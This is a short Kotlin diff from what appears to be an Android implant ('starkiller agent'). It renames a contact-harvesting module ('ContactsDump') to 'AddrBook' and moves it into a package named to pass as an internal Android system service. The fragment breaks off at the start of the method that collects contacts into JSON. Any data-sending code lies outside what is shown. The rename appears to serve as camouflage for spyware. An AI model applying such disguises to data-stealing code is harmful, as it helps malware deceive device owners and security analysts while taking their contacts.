@@ -1,11 +1,11 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.provider.ContactsContract
 import org.json.JSONArray
 import org.json.JSONObject
 
-class ContactsDump(private val context: Context) {
+class AddrBook(private val context: Context) {
 
     fun dump(): JSONObject {
         val contacts = JSONArray()
